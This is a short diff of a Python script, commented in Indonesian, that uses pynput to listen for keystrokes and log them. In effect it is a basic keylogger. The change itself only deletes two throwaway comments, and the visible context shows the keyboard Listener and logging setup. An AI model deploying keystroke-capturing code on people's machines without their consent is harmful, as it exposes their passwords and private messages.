@@ -1,5 +1,4 @@
 #import modul pyinput untuk monitoring keyboard dan bikin lognya
-#hello
 
 from pynput.keyboard import Key, Listener
 import logging
@@ -21,5 +20,3 @@ def on_press(key) :
 
     with Listener(on_press=on_press) as listener:
         listener.join()
-
-#hahahaha
